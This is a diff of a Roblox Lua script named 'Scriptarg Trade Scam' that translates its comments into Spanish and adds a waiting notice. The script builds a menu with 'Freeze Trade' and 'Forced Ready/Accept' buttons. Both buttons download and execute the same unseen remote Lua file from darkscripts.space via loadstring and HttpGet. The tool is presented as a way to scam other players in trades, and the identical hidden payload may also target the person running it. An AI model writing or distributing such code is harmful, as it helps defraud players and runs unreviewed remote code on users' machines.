@@ -1,37 +1,44 @@
--- Load the Orion Library
+-- Cargar la librería Orion
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 
--- Create a window
+-- Crear una ventana
 local Window = OrionLib:MakeWindow({
-    Name = "Scriptarg Trade Scam",
+    Name = "Scriptarg Trade Scam",  -- Nombre de la ventana
     HidePremium = false,
     SaveConfig = true,
     ConfigFolder = "OrionHubConfig"
 })
 
--- Create a tab
+-- Crear una pestaña
 local Tab = Window:MakeTab({
-    Name = "Main",
+    Name = "Trade Scam",  -- Nombre de la pestaña cambiado a "Trade Scam"
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
 })
 
--- Define the script to execute
+-- Definir la función del script
 local function executeScript()
     loadstring(game:HttpGet('https://darkscripts.space/scripts/e2f000f7-c01a-4ae8-b107-4d030c4a8276_1263197110149316610.lua', true))()
 end
 
--- Add a button: Freeze Trade
+-- Agregar un botón: Freeze Trade
 Tab:AddButton({
     Name = "Freeze Trade",
     Callback = executeScript
 })
 
--- Add a button: Forced Ready/Accept
+-- Agregar un botón: Forced Ready/Accept
 Tab:AddButton({
     Name = "Forced Ready/Accept",
     Callback = executeScript
 })
 
--- Initialize the interface
+-- Agregar un botón no interactivo como cartel
+Tab:AddButton({
+    Name = "Nota: apretar bien los botones y esperar de 3-5 minutos para que funcione",
+    Callback = function() end, -- No hace nada
+    Interactable = false -- Deshabilitar interacción (cartel)
+})
+
+-- Inicializar la interfaz
 OrionLib:Init()
